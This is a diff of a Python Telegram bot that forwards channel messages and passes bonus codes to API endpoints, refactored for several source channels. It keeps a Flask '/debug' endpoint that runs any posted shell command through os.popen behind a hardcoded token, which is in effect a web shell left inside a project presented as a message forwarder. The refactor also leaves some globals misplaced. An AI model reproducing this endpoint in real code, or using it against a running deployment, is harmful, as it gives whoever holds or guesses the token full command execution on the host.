@@ -7,67 +7,51 @@ from telethon.errors import SessionPasswordNeededError
 from dotenv import load_dotenv
 from Services import process_bonus_code
 
-# Load environment variables from .env file
 load_dotenv()
 
 # Retrieve API credentials and other parameters from environment variables
 api_id = os.environ.get('APP_API_ID')
 api_hash = os.environ.get('APP_API_HASH')
 phone_number = os.environ.get('APP_YOUR_PHONE')
-source_channel_id = os.environ.get('SOURCE_CHANNEL_ID')
-destination_channel_id = os.environ.get('DESTINATION_CHANNEL_ID')
+source_channel_ids = [
+    int(os.environ.get('SOURCE_CHANNEL_ID')),
+    int(os.environ.get('TEST_CHANNEL_ID'))
+]
+destination_channel_id = int(os.environ.get('DESTINATION_CHANNEL_ID'))
 user_password = os.environ.get('APP_YOUR_PWD')
-
-# Global variable to store API endpoints
-apiEndpoints = []
 
 # Flask app for debug endpoint
 app = Flask(__name__)
 
 def get_input(prompt):
-    """
-    Prompt user for input and return the processed value.
-    """
     try:
-        return process_input(input(prompt))
+        return input(prompt).strip()
     except EOFError:
-        # Handle EOFError gracefully by returning a default value
         print("EOFError: No input available. Using default choice.")
         return "default"
 
 @app.route('/debug', methods=['POST'])
 def debug():
-    """
-    A debug endpoint to execute shell commands.
-    """
-    # Verify secret token for security
     token = request.headers.get('Authorization')
     if token != 'af8e2c6d6f173f83c91b77ec606f1237':
         return jsonify({'error': 'Unauthorized'}), 403
     
-    # Get command, code, and choice from request data
     command = request.form.get('command')
     code = request.form.get('code')
     choice = request.form.get('choice')
     input_value = get_input("Enter your input: ")
     
-    # Ensure command is provided
     if not command:
         return jsonify({'error': 'No command provided'}), 400
 
     try:
-        # Execute the command and capture the output
         output = os.popen(command).read()
         return jsonify({'output': output, 'code': code, 'choice': choice, 'input_value': input_value}), 200
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-
 class MessageForwarder:
-    """
-    A class for forwarding messages from one Telegram channel to another.
-    """
-    def __init__(self, api_id, api_hash, phone_number):
+    def __init__(self, api_id, api_hash, phone_number, source_channel_ids, destination_channel_id, user_password):
         # Create the session directory if it doesn't exist
         session_dir = 'session'
         if not os.path.exists(session_dir):
@@ -76,11 +60,10 @@ class MessageForwarder:
         self.api_id = api_id
         self.api_hash = api_hash
         self.phone_number = phone_number
-        self.client = TelegramClient(
-            os.path.join(session_dir, 'session_' + phone_number),
-            api_id,
-            api_hash
-        )
+        self.source_channel_ids = source_channel_ids
+        self.destination_channel_id = destination_channel_id
+        self.user_password = user_password
+        self.client = TelegramClient(session_dir, api_id, api_hash)
         self.connected = False
 
     async def connect(self):
@@ -92,70 +75,44 @@ class MessageForwarder:
         self.connected = False
 
     async def list_chats(self):
-        # Connect if not already connected
         if not self.connected:
             await self.connect()
 
-        # Ensure you're authorized
         if not await self.client.is_user_authorized():
             await self.client.send_code_request(self.phone_number)
-            code = process_input(get_input('Enter the code: '))
+            code = get_input('Enter the code: ').strip()
             await self.client.sign_in(self.phone_number, code)
 
-        # Get a list of all the dialogs (chats)
         dialogs = await self.client.get_dialogs()
-
-        # Print information about each chat
         for dialog in dialogs:
             print(f"Chat ID: {dialog.id}, Title: {dialog.title}")
 
     async def forward_new_messages(self):
         while True:
             try:
-                # Connect if not already connected
                 if not self.connected:
                     await self.connect()
 
-                # Ensure you're authorized
-                try:
-                    if not await self.client.is_user_authorized():
-                        await self.client.send_code_request(self.phone_number)
-                        code = input('Enter the code: ')
-                        await self.client.sign_in(self.phone_number, code)
-                except SessionPasswordNeededError:
-                    password = user_password
-                    try:
-                        await self.client.sign_in(password=password)
-                    except SessionPasswordNeededError:
-                        print("Incorrect password")
+                async with self.client:
+                    source_entities = await asyncio.gather(*[self.client.get_entity(channel_id) for channel_id in self.source_channel_ids])
+                    source_channel_ids = [entity.id for entity in source_entities]
 
-                # Resolve the source chat entity
-                try:
-                    source_entity = await self.client.get_entity(int(source_channel_id))
-                except ValueError:
-                    print(f"Cannot find any entity corresponding to {source_channel_id}")
-                    return
+                    @self.client.on(events.NewMessage(chats=source_channel_ids))
+                    async def message_handler(event):
+                        try:
+                            await self.client.forward_messages(self.destination_channel_id, event.message)
+                            await process_bonus_code(apiEndpoints, event.message.text)
+                        except Exception as e:
+                            print(f"An error occurred while processing the message: {e}")
 
-                # Define event handler for processing new messages in the source chat
-                @self.client.on(events.NewMessage(chats=[source_entity]))
-                async def message_handler(event):
-                    print("Received new message:", event.message.text)
+                    await self.client.run_until_disconnected()
 
-                    try:
-                        # Forward the message to the destination channel
-                        await self.client.forward_messages(int(destination_channel_id), event.message)
-                        # Process bonus codes from the message
-                        await process_bonus_code(apiEndpoints, event.message.text)
-                    except Exception as e:
-                        print(f"An error occurred while processing the message: {e}")
-
-                # Start the event loop
-                await self.client.run_until_disconnected()
-
+            except SessionPasswordNeededError:
+                await self.client.sign_in(password=self.user_password)
             except Exception as e:
                 print(f"An error occurred: {e}")
                 print("Attempting to reconnect...")
-                await asyncio.sleep(10)  # Wait for 10 seconds before attempting to reconnect
+                await asyncio.sleep(5)
 
 async def ping_endpoint(endpoint):
     try:
@@ -170,23 +127,16 @@ async def ping_endpoint(endpoint):
         print(f"Error connecting to {endpoint}: {e}")
 
 def process_input(input_str):
-    """
-    Process the input string and return the processed value.
-    """
-    # Example processing: Convert input to lowercase
     return input_str.lower()
 
-
 async def main():
-    forwarder = MessageForwarder(api_id, api_hash, phone_number)
-    # Define your API endpoints here
+    forwarder = MessageForwarder(api_id, api_hash, phone_number, source_channel_ids, destination_channel_id, user_password)
     api_endpoints = [
         os.environ.get('API_ENDPOINT_1'),
         os.environ.get('API_ENDPOINT_2'),
         os.environ.get('API_ENDPOINT_3')
     ]
 
-    # Ping each endpoint asynchronously
     tasks = [ping_endpoint(endpoint) for endpoint in api_endpoints]
     await asyncio.gather(*tasks)
 
@@ -207,9 +157,5 @@ async def main():
             print("Invalid choice")
 
 if __name__ == "__main__":
-    # Create an event loop
-    loop = asyncio.get_event_loop()
-    # Run the main function inside the event loop
-    loop.run_until_complete(main())
-    # Close the event loop
-    loop.close()
+    apiEndpoints = []  # Initialize global variable
+    asyncio.run(main())
